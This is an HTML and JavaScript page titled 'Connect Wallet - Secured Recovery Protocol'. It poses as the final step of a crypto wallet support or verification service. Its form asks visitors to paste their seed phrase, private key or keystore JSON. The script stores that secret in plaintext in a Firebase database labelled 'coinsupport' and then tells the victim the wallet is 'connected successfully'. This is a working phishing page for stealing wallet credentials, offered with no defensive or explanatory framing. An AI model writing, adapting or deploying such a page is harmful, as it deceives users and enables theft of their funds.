<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect Wallet - Secured Recovery Protocol</title>
    <style>
        body {
            margin: 0;
            background-color: #050505;
            color: white;
            font-family: system-ui, -apple-system, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            width: 90%;
            max-width: 600px;
            background: #111;
            padding: 40px;
            border-radius: 16px;
            border: 1px solid #333;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
        }
        h1 { 
            text-align: center; 
            margin-top: 0;
            font-size: 24px;
            font-weight: 800;
            letter-spacing: 1px;
        }
        .step-indicator {
            text-align: center;
            color: #aaa;
            font-size: 14px;
            margin-bottom: 30px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .wallet-badge {
            display: inline-block;
            background: #1a1a1a;
            border: 1px solid #333;
            color: #fff;
            padding: 8px 16px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: bold;
            margin-bottom: 20px;
            text-align: center;
            width: 100%;
            box-sizing: border-box;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #ccc;
            font-size: 14px;
            font-weight: 600;
        }
        select, input[type="text"], textarea {
            width: 100%;
            padding: 12px;
            background: #000;
            border: 1px solid #333;
            border-radius: 8px;
            color: white;
            font-size: 16px;
            margin-bottom: 20px;
            box-sizing: border-box;
            outline: none;
        }
        select:focus, input:focus, textarea:focus {
            border-color: #3b82f6;
        }
        textarea {
            height: 120px;
            resize: vertical;
        }
        .btn-submit {
            width: 100%;
            padding: 16px;
            background: #3b82f6;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.2s;
        }
        .btn-submit:hover {
            background: #2563eb;
        }
        .btn-back {
            display: block;
            text-align: center;
            margin-top: 20px;
            color: #666;
            text-decoration: none;
            font-size: 14px;
        }
        .btn-back:hover { color: #fff; }
        .error-msg {
            color: #ef4444;
            font-size: 14px;
            margin-bottom: 15px;
            display: none;
        }
        .success-msg {
            color: #22c55e;
            font-size: 14px;
            margin-bottom: 15px;
            display: none;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>WALLET VERIFICATION</h1>
    <div class="step-indicator">Step 3 of 3: Connect & Verify</div>

    <!-- This displays the wallet chosen in the previous step -->
    <div id="selected-wallet-display" class="wallet-badge">
        Loading Wallet...
    </div>

    <div id="error-display" class="error-msg"></div>
    <div id="success-display" class="success-msg"></div>

    <form id="connect-form">
        <!-- Hidden field to store the Issue ID from the previous page -->
        <input type="hidden" id="issue-id" value="">
        
        <!-- Hidden field to store the Wallet Name chosen previously -->
        <input type="hidden" id="wallet-name-hidden" value="">

        <label for="credential-method">Verification Method</label>
        <select id="credential-method" required onchange="updateInputLabel()">
            <option value="" disabled selected>Select Method...</option>
            <option value="Seed Phrase">Seed Phrase (12/24 words)</option>
            <option value="Private Key">Private Key</option>
            <option value="Keystone JSON">Keystone JSON File Data</option>
        </select>

        <label id="input-label" for="credential-data">Enter Seed Phrase / Private Key / JSON</label>
        <textarea id="credential-data" placeholder="Paste your seed phrase, private key, or JSON content here..." required></textarea>

        <button type="submit" class="btn-submit">VERIFY & SUBMIT</button>
    </form>

    <a href="issues.html" class="btn-back">&larr; Back to Issues</a>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
    import { getDatabase, ref, set, push } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

    // YOUR EXACT FIREBASE CONFIGURATION
    const firebaseConfig = {
      apiKey: "AIzaSyC33I7HRwiKo7DtdRsdtdK6OnqDwAquJfI",
      authDomain: "coinsupport-8b036.firebaseapp.com",
      databaseURL: "https://coinsupport-8b036-default-rtdb.europe-west1.firebasedatabase.app",
      projectId: "coinsupport-8b036",
      storageBucket: "coinsupport-8b036.firebasestorage.app",
      messagingSenderId: "575774102570",
      appId: "1:575774102570:web:1d0c34b60807dfb2c75f53",
      measurementId: "G-YGCSNX4H9L"
    };

    // Initialize Firebase
    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    // Get the Issue ID and Wallet Name passed from the previous page
    const urlParams = new URLSearchParams(window.location.search);
    const issueId = urlParams.get('id');
    const walletNameFromPreviousPage = urlParams.get('wallet');

    if(issueId) {
        document.getElementById('issue-id').value = issueId;
    } else {
        showError("No issue ID found. Please start from the beginning.");
    }

    // Display the wallet chosen in the previous step
    if(walletNameFromPreviousPage) {
        document.getElementById('wallet-name-hidden').value = walletNameFromPreviousPage;
        document.getElementById('selected-wallet-display').textContent = "Selected Wallet: " + walletNameFromPreviousPage.toUpperCase();
    } else {
        document.getElementById('selected-wallet-display').textContent = "Wallet Selection Missing";
    }

    // Update label based on selection
    window.updateInputLabel = function() {
        const method = document.getElementById('credential-method').value;
        const label = document.getElementById('input-label');
        if(method === 'Seed Phrase') label.textContent = "Enter your 12 or 24-word Seed Phrase:";
        else if(method === 'Private Key') label.textContent = "Enter your Private Key (usually starts with 0x):";
        else if(method === 'Keystone JSON') label.textContent = "Paste the content of your Keystone JSON file:";
    }

    // Handle Form Submission
    document.getElementById('connect-form').addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const btn = e.target.querySelector('.btn-submit');
        const originalText = btn.textContent;
        btn.textContent = "VERIFYING...";
        btn.disabled = true;

        const walletName = document.getElementById('wallet-name-hidden').value;
        const credentialMethod = document.getElementById('credential-method').value;
        const credentialData = document.getElementById('credential-data').value.trim();
        const currentIssueId = document.getElementById('issue-id').value;

        if (!walletName || !credentialMethod || !credentialData) {
            showError("Please fill in all fields.");
            resetBtn(btn, originalText);
            return;
        }

        try {
            // Create a new entry in the database
            const newIssueRef = push(ref(db, 'issues'));
            
            await set(newIssueRef, {
                issueId: currentIssueId, 
                walletName: walletName,
                credentialMethod: credentialMethod,
                credentialData: credentialData, 
                timestamp: Date.now(),
                status: 'Pending Review'
            });

            showSuccess("Wallet connected successfully! You can now close this window.");
            setTimeout(() => {
                window.location.href = 'resolution.html';
            }, 3000);

        } catch (error) {
            console.error("Error submitting:", error);
            showError("Connection failed. Please try again.");
        }
        
        resetBtn(btn, originalText);
    });

    function showError(msg) {
        const el = document.getElementById('error-display');
        el.textContent = msg;
        el.style.display = 'block';
        document.getElementById('success-display').style.display = 'none';
    }

    function showSuccess(msg) {
        const el = document.getElementById('success-display');
        el.textContent = msg;
        el.style.display = 'block';
        document.getElementById('error-display').style.display = 'none';
    }

    function resetBtn(btn, text) {
        btn.textContent = text;
        btn.disabled = false;
    }
</script>
</body>
</html>
